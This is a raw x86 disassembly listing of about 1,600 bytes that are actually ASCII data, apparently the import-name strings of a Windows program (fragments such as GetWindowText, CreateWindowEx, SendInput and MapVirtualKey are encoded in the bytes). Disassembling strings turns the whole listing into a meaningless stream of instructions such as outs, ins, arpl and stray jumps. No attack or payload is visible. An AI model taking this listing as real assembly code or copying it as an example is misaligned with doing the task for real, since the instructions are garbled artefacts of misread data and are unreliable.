  41e287:	add    DWORD PTR [edi+0x65],eax
  41e28a:	je     0x41e2e3
  41e28c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e293:	js     0x41e309
  41e295:	inc    ecx
  41e296:	add    BYTE PTR [eax],al
  41e298:	and    eax,0x6e655302
  41e29d:	fs dec ecx
  41e29f:	outs   dx,BYTE PTR ds:[esi]
  41e2a0:	jo     0x41e317
  41e2a2:	je     0x41e2a4
  41e2a4:	mov    edi,0x636f4c01
  41e2a9:	imul   edx,DWORD PTR [edi+0x69],0x6e
  41e2ad:	outs   dx,DWORD PTR fs:[esi]
  41e2af:	ja     0x41e306
  41e2b1:	jo     0x41e317
  41e2b3:	popa   
  41e2b4:	je     0x41e31b
  41e2b6:	add    BYTE PTR [eax],al
  41e2b8:	mov    bh,0x2
  41e2ba:	push   edi
  41e2bb:	popa   
  41e2bc:	imul   esi,DWORD PTR [esi+eax*2+0x6f],0x706e4972
  41e2c4:	jne    0x41e33a
  41e2c6:	dec    ecx
  41e2c7:	fs ins BYTE PTR es:[edi],dx
  41e2c9:	add    BYTE PTR gs:[eax],al
  41e2cc:	dec    eax
  41e2cd:	add    dl,BYTE PTR [ebx+0x65]
  41e2d0:	je     0x41e31f
  41e2d2:	outs   dx,BYTE PTR gs:[esi]
  41e2d4:	jne    0x41e2d6
  41e2d6:	sub    eax,DWORD PTR [ecx]
  41e2d8:	inc    edi
  41e2d9:	gs je  0x41e329
  41e2dc:	outs   dx,BYTE PTR gs:[esi]
  41e2de:	jne    0x41e2e0
  41e2e0:	adc    eax,DWORD PTR [edx]
  41e2e2:	push   edx
  41e2e3:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x69577265
  41e2ec:	outs   dx,BYTE PTR ds:[esi]
  41e2ed:	outs   dx,DWORD PTR fs:[esi]
  41e2ef:	ja     0x41e33e
  41e2f1:	gs jae 0x41e367
  41e2f4:	popa   
  41e2f5:	addr16 gs push edi
  41e2f8:	add    BYTE PTR [eax],al
  41e2fa:	push   ebp
  41e2fb:	add    DWORD PTR [edi+0x65],eax
  41e2fe:	je     0x41e353
  41e300:	arpl   WORD PTR [edx+0x6f],si
  41e303:	ins    BYTE PTR es:[edi],dx
  41e304:	ins    BYTE PTR es:[edi],dx
  41e305:	push   eax
  41e306:	outs   dx,DWORD PTR ds:[esi]
  41e307:	jae    0x41e309
  41e309:	add    bh,cl
  41e30b:	add    DWORD PTR [ebp+0x65],ecx
  41e30e:	jae    0x41e383
  41e310:	popa   
  41e311:	addr16 gs inc edx
  41e314:	outs   dx,DWORD PTR ds:[esi]
  41e315:	js     0x41e35c
  41e317:	js     0x41e35a
  41e319:	add    BYTE PTR [ecx+eax*1+0x68437349],dl
  41e320:	imul   ebp,DWORD PTR [esp+eiz*2+0x0],0x65470164
  41e328:	je     0x41e37f
  41e32a:	jo     0x41e390
  41e32c:	popa   
  41e32d:	je     0x41e394
  41e32f:	push   edx
  41e330:	outs   dx,BYTE PTR ds:[si]
  41e332:	add    BYTE PTR [eax],al
  41e334:	mov    dh,0x1
  41e336:	dec    esp
  41e337:	outs   dx,DWORD PTR ds:[esi]
  41e338:	popa   
  41e339:	fs dec ebp
  41e33b:	outs   dx,BYTE PTR gs:[esi]
  41e33d:	jne    0x41e380
  41e33f:	add    BYTE PTR [ecx],cl
  41e341:	add    BYTE PTR [ecx+0x70],al
  41e344:	jo     0x41e3ab
  41e346:	outs   dx,BYTE PTR ds:[esi]
  41e347:	fs dec ebp
  41e349:	outs   dx,BYTE PTR gs:[esi]
  41e34b:	jne    0x41e3a4
  41e34d:	add    BYTE PTR [ebp+0x0],bl
  41e350:	inc    ebx
  41e351:	jb     0x41e3b8
  41e353:	popa   
  41e354:	je     0x41e3bb
  41e356:	dec    ecx
  41e357:	arpl   WORD PTR [edi+0x6e],bp
  41e35a:	dec    ecx
  41e35b:	outs   dx,BYTE PTR ds:[esi]
  41e35c:	imul   esi,DWORD PTR fs:[edx+0x65],0x7463
  41e364:	ins    BYTE PTR es:[edi],dx
  41e365:	add    DWORD PTR [edi+0x65],eax
  41e368:	je     0x41e3c1
  41e36a:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e371:	outs   dx,BYTE PTR ds:[esi]
  41e372:	addr16 inc ecx
  41e374:	add    BYTE PTR [eax],al
  41e376:	ja     0x41e379
  41e378:	inc    edi
  41e379:	gs je  0x41e3d3
  41e37c:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e383:	js     0x41e3f9
  41e385:	dec    esp
  41e386:	outs   dx,BYTE PTR gs:[esi]
  41e388:	addr16 je 0x41e3f3
  41e38b:	push   edi
  41e38c:	add    BYTE PTR [eax],al
  41e38e:	cmp    eax,0x65684300
  41e393:	arpl   WORD PTR [ebx+0x52],bp
  41e396:	popa   
  41e397:	imul   ebp,DWORD PTR fs:[edi+0x42],0x6f747475
  41e39f:	outs   dx,BYTE PTR ds:[esi]
  41e3a0:	add    BYTE PTR [eax],al
  41e3a2:	add    BYTE PTR [ecx],0x49
  41e3a5:	outs   dx,BYTE PTR ds:[esi]
  41e3a6:	data16 ins BYTE PTR es:[edi],dx
  41e3a8:	popa   
  41e3a9:	je     0x41e410
  41e3ab:	push   edx
  41e3ac:	arpl   WORD PTR gs:[eax+eax*1-0x70],si
  41e3b1:	add    dl,BYTE PTR [edx+esi*2+0x61]
  41e3b5:	arpl   WORD PTR [ebx+0x50],bp
  41e3b8:	outs   dx,DWORD PTR ds:[esi]
  41e3b9:	jo     0x41e430
  41e3bb:	jo     0x41e40a
  41e3bd:	outs   dx,BYTE PTR gs:[esi]
  41e3bf:	jne    0x41e3c1
  41e3c1:	add    BYTE PTR ds:0x6c655202,dl
  41e3c7:	gs popa 
  41e3c9:	jae    0x41e430
  41e3cb:	inc    esp
  41e3cc:	inc    ebx
  41e3cd:	add    BYTE PTR [ebx],ch
  41e3cf:	add    dl,BYTE PTR [ebx+0x65]
  41e3d2:	outs   dx,BYTE PTR ds:[esi]
  41e3d3:	fs dec ebp
  41e3d5:	gs jae 0x41e44b
  41e3d8:	popa   
  41e3d9:	addr16 gs push edi
  41e3dc:	add    BYTE PTR [eax],al
  41e3de:	fild   DWORD PTR [ecx]
  41e3e0:	dec    ebp
  41e3e1:	outs   dx,DWORD PTR ds:[esi]
  41e3e2:	jbe    0x41e449
  41e3e4:	push   edi
  41e3e5:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e3ec:	mov    dl,0x0
  41e3ee:	inc    esp
  41e3ef:	jb     0x41e452
  41e3f1:	ja     0x41e439
  41e3f3:	jb     0x41e456
  41e3f5:	ins    DWORD PTR es:[edi],dx
  41e3f6:	gs inc ebx
  41e3f8:	outs   dx,DWORD PTR ds:[esi]
  41e3f9:	outs   dx,BYTE PTR ds:[esi]
  41e3fa:	je     0x41e46e
  41e3fc:	outs   dx,DWORD PTR ds:[esi]
  41e3fd:	ins    BYTE PTR es:[edi],dx
  41e3fe:	add    BYTE PTR [eax],al
  41e400:	stos   DWORD PTR es:[edi],eax
  41e401:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e405:	fs inc ebx
  41e407:	jne    0x41e47b
  41e409:	jae    0x41e47a
  41e40b:	jb     0x41e44e
  41e40d:	add    BYTE PTR [eax+0x2],ch
  41e410:	push   ebx
  41e411:	gs je  0x41e469
  41e414:	jae    0x41e47b
  41e416:	jb     0x41e467
  41e418:	bound  ebp,QWORD PTR [edx+0x65]
  41e41b:	arpl   WORD PTR [ecx+ecx*2+0x6e],si
  41e41f:	outs   dx,WORD PTR ds:[esi]
  41e421:	jb     0x41e490
  41e423:	popa   
  41e424:	je     0x41e48f
  41e426:	outs   dx,DWORD PTR ds:[esi]
  41e427:	outs   dx,BYTE PTR ds:[esi]
  41e428:	push   edi
  41e429:	add    BYTE PTR [ecx+0x0],ah
  41e42c:	inc    ebx
  41e42d:	jb     0x41e494
  41e42f:	popa   
  41e430:	je     0x41e497
  41e432:	push   eax
  41e433:	outs   dx,DWORD PTR ds:[esi]
  41e434:	jo     0x41e4ab
  41e436:	jo     0x41e485
  41e438:	outs   dx,BYTE PTR gs:[esi]
  41e43a:	jne    0x41e43c
  41e43c:	xor    al,0x2
  41e43e:	push   ebx
  41e43f:	gs je  0x41e485
  41e442:	ins    BYTE PTR es:[edi],dx
  41e443:	popa   
  41e444:	jae    0x41e4b9
  41e446:	dec    esp
  41e447:	outs   dx,DWORD PTR ds:[esi]
  41e448:	outs   dx,BYTE PTR ds:[esi]
  41e449:	addr16 push edi
  41e44b:	add    BYTE PTR [ebx+0x0],ah
  41e44e:	inc    ebx
  41e44f:	jb     0x41e4b6
  41e451:	popa   
  41e452:	je     0x41e4b9
  41e454:	push   edi
  41e455:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e45c:	push   edi
  41e45d:	add    BYTE PTR [ecx+eax*1+0x63497349],bl
  41e464:	outs   dx,DWORD PTR ds:[esi]
  41e465:	outs   dx,BYTE PTR ds:[esi]
  41e466:	imul   esp,DWORD PTR [ebx+0x0],0x49018500
  41e46d:	outs   dx,BYTE PTR ds:[esi]
  41e46e:	jae    0x41e4d5
  41e470:	jb     0x41e4e6
  41e472:	dec    ebp
  41e473:	outs   dx,BYTE PTR gs:[esi]
  41e475:	jne    0x41e4c0
  41e477:	je     0x41e4de
  41e479:	ins    DWORD PTR es:[edi],dx
  41e47a:	push   edi
  41e47b:	add    ah,ah
  41e47d:	add    DWORD PTR [edi+0x66],ecx
  41e480:	data16 jae 0x41e4e8
  41e483:	je     0x41e4d7
  41e485:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e48a:	scas   al,BYTE PTR es:[edi]
  41e48b:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e48f:	fs inc ebx
  41e491:	jne    0x41e505
  41e493:	jae    0x41e504
  41e495:	jb     0x41e4ee
  41e497:	add    BYTE PTR [ebx],al
  41e499:	add    BYTE PTR [ecx+0x64],al
  41e49c:	push   0x75
  41e49e:	jae    0x41e514
  41e4a0:	push   edi
  41e4a1:	imul   ebp,DWORD PTR [esi+0x64],0x6552776f
  41e4a8:	arpl   WORD PTR [ebp+eax*2+0x78],si
  41e4ac:	add    BYTE PTR [eax],al
  41e4ae:	js     0x41e4b1
  41e4b0:	inc    edi
  41e4b1:	gs je  0x41e50b
  41e4b4:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e4bb:	js     0x41e531
  41e4bd:	push   edi
  41e4be:	add    BYTE PTR [eax],al
  41e4c0:	push   cs
  41e4c1:	add    DWORD PTR [edi+0x65],eax
  41e4c4:	je     0x41e50a
  41e4c6:	ins    BYTE PTR es:[edi],dx
  41e4c7:	addr16 inc ebx
  41e4c9:	je     0x41e53d
  41e4cb:	ins    BYTE PTR es:[edi],dx
  41e4cc:	dec    ecx
  41e4cd:	inc    esp
  41e4ce:	add    BYTE PTR [eax],al
  41e4d0:	mov    esp,0x6e695702
  41e4d5:	outs   dx,DWORD PTR fs:[esi]
  41e4d7:	ja     0x41e51f
  41e4d9:	jb     0x41e54a
  41e4db:	ins    DWORD PTR es:[edi],dx
  41e4dc:	push   eax
  41e4dd:	outs   dx,DWORD PTR ds:[esi]
  41e4de:	imul   ebp,DWORD PTR [esi+0x74],0x49018300
  41e4e5:	outs   dx,BYTE PTR ds:[esi]
  41e4e6:	jae    0x41e54d
  41e4e8:	jb     0x41e55e
  41e4ea:	dec    ebp
  41e4eb:	outs   dx,BYTE PTR gs:[esi]
  41e4ed:	jne    0x41e530
  41e4ef:	add    BYTE PTR [esi+0x73795302],al
  41e4f5:	je     0x41e55c
  41e4f7:	ins    DWORD PTR es:[edi],dx
  41e4f8:	push   eax
  41e4f9:	popa   
  41e4fa:	jb     0x41e55d
  41e4fc:	ins    DWORD PTR es:[edi],dx
  41e4fd:	gs je  0x41e565
  41e500:	jb     0x41e575
  41e502:	dec    ecx
  41e503:	outs   dx,BYTE PTR ds:[esi]
  41e504:	outs   dx,WORD PTR ds:[esi]
  41e506:	push   edi
  41e507:	add    BYTE PTR [edx],dh
  41e509:	add    DWORD PTR [edi+0x65],eax
  41e50c:	je     0x41e55b
  41e50e:	outs   dx,BYTE PTR gs:[esi]
  41e510:	jne    0x41e55b
  41e512:	je     0x41e579
  41e514:	ins    DWORD PTR es:[edi],dx
  41e515:	inc    ebx
  41e516:	outs   dx,DWORD PTR ds:[esi]
  41e517:	jne    0x41e587
  41e519:	je     0x41e51b
  41e51b:	add    BYTE PTR [ecx+0x4b6b5602],dh
  41e521:	gs jns 0x41e577
  41e524:	arpl   WORD PTR [ecx+0x6e],sp
  41e527:	push   edi
  41e528:	add    BYTE PTR [eax],al
  41e52a:	add    eax,DWORD PTR [edx]
  41e52c:	push   edx
  41e52d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e536:	popa   
  41e537:	jae    0x41e5ac
  41e539:	inc    ebp
  41e53a:	js     0x41e57d
  41e53c:	add    BYTE PTR [eax],al
  41e53e:	ret    
  41e53f:	add    BYTE PTR [ebp+0x6e],al
  41e542:	fs inc esp
  41e544:	imul   esp,DWORD PTR [ecx+0x6c],0x4600676f
  41e54b:	add    BYTE PTR [ebx+0x6c],al
  41e54e:	outs   dx,DWORD PTR ds:[esi]
  41e54f:	jae    0x41e5b6
  41e551:	inc    esp
  41e552:	gs jae 0x41e5c0
  41e555:	je     0x41e5c6
  41e557:	jo     0x41e559
  41e559:	add    BYTE PTR [eax+0x44734901],bl
  41e55f:	imul   esp,DWORD PTR [ecx+0x6c],0x654d676f
  41e566:	jae    0x41e5db
  41e568:	popa   
  41e569:	addr16 gs push edi
  41e56c:	add    BYTE PTR [eax],al
  41e56e:	out    0x1,eax
  41e570:	dec    edi
  41e571:	jo     0x41e5d8
  41e573:	outs   dx,BYTE PTR ds:[esi]
  41e574:	inc    esp
  41e575:	gs jae 0x41e5e3
  41e578:	je     0x41e5e9
  41e57a:	jo     0x41e5d3
  41e57c:	add    BYTE PTR [eax],al
  41e57e:	and    BYTE PTR [edx],al
  41e580:	push   ebx
  41e581:	arpl   WORD PTR [edx+0x6f],si
  41e584:	ins    BYTE PTR es:[edi],dx
  41e585:	ins    BYTE PTR es:[edi],dx
  41e586:	push   edi
  41e587:	imul   ebp,DWORD PTR [esi+0x64],0x7845776f
  41e58e:	add    BYTE PTR [eax],al
  41e590:	mov    al,ds:0x57734901
  41e595:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e59c:	xor    eax,0x61684300
  41e5a1:	jb     0x41e5f7
  41e5a3:	outs   dx,DWORD PTR ds:[esi]
  41e5a4:	dec    edi
  41e5a5:	gs ins DWORD PTR es:[edi],dx
  41e5a7:	push   edi
  41e5a8:	add    BYTE PTR [eax],al
  41e5aa:	xor    al,BYTE PTR [edx]
  41e5ac:	push   ebx
  41e5ad:	gs je  0x41e5f3
  41e5b0:	popa   
  41e5b1:	jb     0x41e618
  41e5b3:	je     0x41e605
  41e5b5:	outs   dx,DWORD PTR ds:[esi]
  41e5b6:	jae    0x41e5b8
  41e5b8:	daa    
  41e5b9:	add    DWORD PTR [edi+0x65],eax
  41e5bc:	je     0x41e609
  41e5be:	gs jns 0x41e623
  41e5c1:	outs   dx,DWORD PTR ds:[esi]
  41e5c2:	popa   
  41e5c3:	jb     0x41e629
  41e5c5:	push   esp
  41e5c6:	jns    0x41e638
  41e5c8:	gs add bh,ch
  41e5cb:	add    DWORD PTR [eax+0x65],edx
  41e5ce:	imul   ecx,DWORD PTR gs:[ebp+0x65],0x73
  41e5d3:	jae    0x41e636
  41e5d5:	addr16 gs push edi
  41e5d8:	add    BYTE PTR [eax],al
  41e5da:	push   0x74654701
  41e5df:	push   edi
  41e5e0:	imul   ebp,DWORD PTR [esi+0x64],0x5900776f
  41e5e7:	add    BYTE PTR [ebx+0x72],al
  41e5ea:	gs popa 
  41e5ec:	je     0x41e653
  41e5ee:	inc    esp
  41e5ef:	imul   esp,DWORD PTR [ecx+0x6c],0x6150676f
  41e5f6:	jb     0x41e659
  41e5f8:	ins    DWORD PTR es:[edi],dx
  41e5f9:	push   edi
  41e5fa:	add    BYTE PTR [eax],al
  41e5fc:	je     0x41e600
  41e5fe:	push   ebx
  41e5ff:	gs je  0x41e659
  41e602:	imul   ebp,DWORD PTR [esi+0x64],0x6554776f
  41e609:	js     0x41e67f
  41e60b:	push   edi
  41e60c:	add    BYTE PTR [eax],al
  41e60e:	xchg   ebx,eax
  41e60f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e613:	je     0x41e687
  41e615:	outs   dx,DWORD PTR ds:[esi]
  41e616:	jns    0x41e659
  41e618:	arpl   WORD PTR [ebx+0x65],sp
  41e61b:	ins    BYTE PTR es:[edi],dx
  41e61c:	gs jb  0x41e680
  41e61f:	je     0x41e690
  41e621:	jb     0x41e677
  41e623:	popa   
  41e624:	bound  ebp,QWORD PTR [ebp+eiz*2+0x0]
  41e628:	cmc    
  41e629:	add    BYTE PTR [edi+0x65],al
  41e62c:	je     0x41e671
  41e62e:	ins    BYTE PTR es:[edi],dx
  41e62f:	popa   
  41e630:	jae    0x41e6a5
  41e632:	dec    ecx
  41e633:	outs   dx,BYTE PTR ds:[esi]
  41e634:	outs   dx,WORD PTR ds:[esi]
  41e636:	inc    ebp
  41e637:	js     0x41e67a
  41e639:	add    BYTE PTR [ebp+0x1],ch
  41e63c:	inc    edi
  41e63d:	gs je  0x41e697
  41e640:	imul   ebp,DWORD PTR [esi+0x64],0x6f4c776f
  41e647:	outs   dx,BYTE PTR ds:[esi]
  41e648:	addr16 push edi
  41e64a:	add    BYTE PTR [eax],al
  41e64c:	fld    QWORD PTR [eax]
  41e64e:	inc    ebp
  41e64f:	jno    0x41e6c6
  41e651:	popa   
  41e652:	ins    BYTE PTR es:[edi],dx
  41e653:	push   edx
  41e654:	arpl   WORD PTR gs:[eax+eax*1+0x5b],si
  41e659:	add    dl,BYTE PTR [ebx+0x65]
  41e65c:	je     0x41e6b1
  41e65e:	arpl   WORD PTR [edx+0x6f],si
  41e661:	ins    BYTE PTR es:[edi],dx
  41e662:	ins    BYTE PTR es:[edi],dx
  41e663:	push   eax
  41e664:	outs   dx,DWORD PTR ds:[esi]
  41e665:	jae    0x41e667
  41e667:	add    BYTE PTR [edx+0x57734901],ah
  41e66d:	imul   ebp,DWORD PTR [esi+0x64],0x6e55776f
  41e674:	imul   esp,DWORD PTR [ebx+0x6f],0xa6006564
  41e67b:	add    DWORD PTR [ebx+0x69],ecx
  41e67e:	ins    BYTE PTR es:[edi],dx
  41e67f:	ins    BYTE PTR es:[edi],dx
  41e680:	push   esp
  41e681:	imul   ebp,DWORD PTR [ebp+0x65],0x1810072
  41e688:	dec    ecx
  41e689:	outs   dx,BYTE PTR ds:[esi]
  41e68a:	push   ebx
  41e68b:	outs   dx,BYTE PTR gs:[esi]
  41e68d:	fs dec ebp
  41e68f:	gs jae 0x41e705
  41e692:	popa   
  41e693:	addr16 gs inc ebp
  41e696:	js     0x41e698
  41e698:	pop    ebx
  41e699:	add    BYTE PTR [ebx+0x72],al
  41e69c:	gs popa 
  41e69e:	je     0x41e705
  41e6a0:	dec    ecx
  41e6a1:	arpl   WORD PTR [edi+0x6e],bp
  41e6a4:	inc    esi
  41e6a5:	jb     0x41e716
  41e6a7:	ins    DWORD PTR es:[edi],dx
  41e6a8:	push   edx
  41e6a9:	gs jae 0x41e71b
  41e6ac:	jne    0x41e720
  41e6ae:	arpl   WORD PTR [ebp+0x0],sp
  41e6b1:	add    BYTE PTR [edx+0x0],cl
  41e6b4:	inc    ebx
  41e6b5:	outs   dx,DWORD PTR ds:[esi]
  41e6b6:	jo     0x41e731
  41e6b8:	inc    ecx
  41e6b9:	arpl   WORD PTR [ebx+0x65],sp
  41e6bc:	ins    BYTE PTR es:[edi],dx
  41e6bd:	gs jb  0x41e721
  41e6c0:	je     0x41e731
  41e6c2:	jb     0x41e718
  41e6c4:	popa   
  41e6c5:	bound  ebp,QWORD PTR [ebp+eiz*2+0x57]
  41e6c9:	add    BYTE PTR [esi+0x66654400],cl
  41e6cf:	push   edi
  41e6d0:	imul   ebp,DWORD PTR [esi+0x64],0x7250776f
  41e6d7:	outs   dx,DWORD PTR ds:[esi]
  41e6d8:	arpl   WORD PTR [ecx+0x0],ax
  41e6db:	add    BYTE PTR [ebp+0x79656b02],bh
  41e6e1:	bound  esp,QWORD PTR [edi+ebx*2+0x65]
  41e6e5:	jbe    0x41e74c
  41e6e7:	outs   dx,BYTE PTR ds:[esi]
  41e6e8:	je     0x41e6ea
  41e6ea:	fadd   QWORD PTR [eax]
  41e6ec:	inc    ebp
  41e6ed:	outs   dx,BYTE PTR ds:[esi]
  41e6ee:	jne    0x41e75d
  41e6f0:	push   edi
  41e6f1:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e6f8:	adc    eax,DWORD PTR [ecx]
  41e6fa:	inc    edi
  41e6fb:	gs je  0x41e742
  41e6fe:	outs   dx,DWORD PTR ds:[esi]
  41e6ff:	jne    0x41e763
  41e701:	ins    BYTE PTR es:[edi],dx
  41e702:	gs inc ebx
  41e704:	ins    BYTE PTR es:[edi],dx
  41e705:	imul   esp,DWORD PTR [ebx+0x6b],0x656d6954
  41e70c:	add    BYTE PTR [eax],al
  41e70e:	cwde   
  41e70f:	add    BYTE PTR [ebp+eiz*2+0x73],al
  41e713:	je     0x41e787
  41e715:	outs   dx,DWORD PTR ds:[esi]
  41e716:	jns    0x41e76f
  41e718:	imul   ebp,DWORD PTR [esi+0x64],0x2e00776f
  41e71f:	add    BYTE PTR [ebx+0x68],al
  41e722:	popa   
  41e723:	jb     0x41e775
  41e725:	jb     0x41e78c
  41e727:	jbe    0x41e76a
  41e729:	add    BYTE PTR [esi],ah
  41e72b:	add    dl,BYTE PTR [ebx+0x65]
  41e72e:	outs   dx,BYTE PTR ds:[esi]
  41e72f:	fs dec ebp
  41e731:	gs jae 0x41e7a7
  41e734:	popa   
  41e735:	addr16 gs inc ecx
  41e738:	add    BYTE PTR [eax],al
  41e73a:	mov    DWORD PTR [eax],eax
  41e73c:	inc    esp
  41e73d:	gs inc si
  41e740:	jb     0x41e7a3
  41e742:	ins    DWORD PTR es:[edi],dx
  41e743:	gs push eax
  41e745:	jb     0x41e7b6
  41e747:	arpl   WORD PTR [ecx+0x0],ax
  41e74a:	or     al,BYTE PTR [edx]
  41e74c:	push   edx
  41e74d:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6f487265
  41e756:	je     0x41e7a3
  41e758:	gs jns 0x41e75b
  41e75b:	add    BYTE PTR [eax],bh
  41e75d:	add    dl,BYTE PTR [ebx+0x65]
  41e760:	je     0x41e7a5
  41e762:	jne    0x41e7d6
  41e764:	jae    0x41e7d5
  41e766:	jb     0x41e768
  41e768:	push   0x1
  41e76a:	inc    edi
  41e76b:	gs je  0x41e7c5
  41e76e:	imul   ebp,DWORD PTR [esi+0x64],0x4344776f
  41e775:	add    BYTE PTR ds:0x74655302,bh
  41e77b:	inc    esp
  41e77c:	ins    BYTE PTR es:[edi],dx
  41e77d:	addr16 dec ecx
  41e77f:	je     0x41e7e6
  41e781:	ins    DWORD PTR es:[edi],dx
  41e782:	dec    ecx
  41e783:	outs   dx,BYTE PTR ds:[esi]
  41e784:	je     0x41e786
  41e786:	sbb    eax,0x73614300
  41e78b:	arpl   WORD PTR [ecx+0x64],sp
  41e78e:	gs push edi
  41e790:	imul   ebp,DWORD PTR [esi+0x64],0x73776f
  41e797:	add    BYTE PTR [ebx],dh
  41e799:	add    DWORD PTR [edi+0x65],eax
  41e79c:	je     0x41e7eb
  41e79e:	outs   dx,BYTE PTR gs:[esi]
  41e7a0:	jne    0x41e7eb
  41e7a2:	je     0x41e809
  41e7a4:	ins    DWORD PTR es:[edi],dx
  41e7a5:	dec    ecx
  41e7a6:	inc    esp
  41e7a7:	add    BYTE PTR [eax+eax*1+0x6c616944],bl
  41e7ae:	outs   dx,DWORD PTR ds:[esi]
  41e7af:	addr16 inc edx
  41e7b1:	outs   dx,DWORD PTR ds:[esi]
  41e7b2:	js     0x41e804
  41e7b4:	popa   
  41e7b5:	jb     0x41e818
  41e7b7:	ins    DWORD PTR es:[edi],dx
  41e7b8:	inc    ecx
  41e7b9:	add    BYTE PTR [edx+eax*1+0x74697753],al
  41e7c0:	arpl   WORD PTR [eax+0x54],bp
  41e7c3:	outs   dx,DWORD PTR ds:[esi]
  41e7c4:	push   esp
  41e7c5:	push   0x69577369
  41e7ca:	outs   dx,BYTE PTR ds:[esi]
  41e7cb:	outs   dx,DWORD PTR fs:[esi]
  41e7cd:	ja     0x41e7cf
  41e7cf:	add    BYTE PTR [eax+eax*1],bh
  41e7d2:	inc    ebx
  41e7d3:	push   0x4d6b6365
  41e7d8:	outs   dx,BYTE PTR gs:[esi]
  41e7da:	jne    0x41e82e
  41e7dc:	popa   
  41e7dd:	imul   ebp,DWORD PTR fs:[edi+0x49],0x6d6574
  41e7e5:	add    ah,al
  41e7e7:	add    DWORD PTR [ebp+0x61],ecx
  41e7ea:	jo     0x41e830
  41e7ec:	imul   esp,DWORD PTR [ecx+0x6c],0x6552676f
  41e7f3:	arpl   WORD PTR [eax+eax*1-0x5],si
  41e7f7:	add    DWORD PTR [eax+0x74],edx
  41e7fa:	dec    ecx
  41e7fb:	outs   dx,BYTE PTR ds:[esi]
  41e7fc:	push   edx
  41e7fd:	arpl   WORD PTR gs:[eax+eax*1+0x0],si
  41e802:	cdq    
  41e803:	add    DWORD PTR [ecx+0x73],ecx
  41e806:	inc    esp
  41e807:	ins    BYTE PTR es:[edi],dx
  41e808:	addr16 inc edx
  41e80a:	jne    0x41e880
  41e80c:	je     0x41e87d
  41e80e:	outs   dx,BYTE PTR ds:[esi]
  41e80f:	inc    ebx
  41e810:	push   0x656b6365
  41e815:	add    BYTE PTR fs:[eax],al
  41e818:	mov    edi,0x70737702
  41e81d:	jb     0x41e888
  41e81f:	outs   dx,BYTE PTR ds:[esi]
  41e820:	je     0x41e888
  41e822:	inc    ecx
  41e823:	add    BYTE PTR [ebx+0x1],bl
  41e826:	inc    edi
  41e827:	gs je  0x41e87d
  41e82a:	jns    0x41e89f
  41e82c:	je     0x41e893
  41e82e:	ins    DWORD PTR es:[edi],dx
  41e82f:	dec    ebp
  41e830:	outs   dx,BYTE PTR gs:[esi]
  41e832:	jne    0x41e834
  41e834:	add    al,0x2
  41e836:	push   edx
  41e837:	imul   esi,DWORD PTR gs:[bp+di+0x74],0x6c437265
  41e840:	popa   
  41e841:	jae    0x41e8b6
  41e843:	inc    ebp
  41e844:	js     0x41e89d
  41e846:	add    BYTE PTR [eax],al
  41e848:	pusha  
  41e849:	add    BYTE PTR [ebx+0x72],al
  41e84c:	gs popa 
  41e84e:	je     0x41e8b5
  41e850:	dec    ebp
  41e851:	outs   dx,BYTE PTR gs:[esi]
  41e853:	jne    0x41e855
  41e855:	add    al,bh
  41e857:	add    BYTE PTR [edi+0x65],al
  41e85a:	je     0x41e89f
  41e85c:	ins    BYTE PTR es:[edi],dx
  41e85d:	popa   
  41e85e:	jae    0x41e8d3
  41e860:	dec    esp
  41e861:	outs   dx,DWORD PTR ds:[esi]
  41e862:	outs   dx,BYTE PTR ds:[esi]
  41e863:	addr16 inc ecx
  41e865:	add    BYTE PTR ds:0x74654701,dh
  41e86b:	dec    ebp
  41e86c:	outs   dx,BYTE PTR gs:[esi]
  41e86e:	jne    0x41e8b9
  41e870:	je     0x41e8d7
  41e872:	ins    DWORD PTR es:[edi],dx
  41e873:	dec    ecx
  41e874:	outs   dx,BYTE PTR ds:[esi]
  41e875:	outs   dx,WORD PTR ds:[esi]
  41e877:	push   edi
  41e878:	add    BYTE PTR [eax],al
  41e87a:	mov    ecx,0x616f4c01
  41e87f:	fs dec ebp
  41e881:	outs   dx,BYTE PTR gs:[esi]
  41e883:	jne    0x41e8dc
  41e885:	add    BYTE PTR [edx+0x1],ah
  41e888:	inc    edi
  41e889:	gs je  0x41e8e0
  41e88c:	outs   dx,DWORD PTR ds:[esi]
  41e88d:	jo     0x41e8e6
  41e88f:	imul   ebp,DWORD PTR [esi+0x64],0x776f
  41e896:	dec    ebx
  41e897:	add    DWORD PTR [edi+0x65],eax
  41e89a:	je     0x41e8ec
  41e89c:	jb     0x41e90d
  41e89e:	jo     0x41e8f7
  41e8a0:	add    BYTE PTR [eax],al
  41e8a2:	cmp    al,BYTE PTR [edx]
  41e8a4:	push   ebx
  41e8a5:	gs je  0x41e8eb
  41e8a8:	jne    0x41e91c
  41e8aa:	jae    0x41e91b
  41e8ac:	jb     0x41e8fe
  41e8ae:	outs   dx,DWORD PTR ds:[esi]
  41e8af:	jae    0x41e8b1
  41e8b1:	add    bh,al
  41e8b3:	add    DWORD PTR [ebp+0x61],ecx
  41e8b6:	jo     0x41e90e
  41e8b8:	imul   esi,DWORD PTR [edx+0x74],0x4b6c6175
  41e8bf:	gs jns 0x41e907
  41e8c2:	js     0x41e91b
  41e8c4:	add    BYTE PTR [eax],al
  41e8c6:	jp     0x41e8ca
  41e8c8:	push   ebx
  41e8c9:	push   0x6143776f
  41e8ce:	jb     0x41e935
  41e8d0:	je     0x41e8d2
  41e8d2:	add    eax,0x67655202
  41e8d7:	imul   esi,DWORD PTR [ebx+0x74],0x6c437265
  41e8de:	popa   
  41e8df:	jae    0x41e954
  41e8e1:	push   edi
  41e8e2:	add    BYTE PTR [eax],al
  41e8e4:	scas   eax,DWORD PTR es:[edi]
  41e8e5:	add    DWORD PTR [edi+ebp*2+0x61],ecx
  41e8e9:	fs dec ecx
  41e8eb:	arpl   WORD PTR [edi+0x6e],bp
  41e8ee:	inc    ecx
  41e8ef:	add    bl,dh
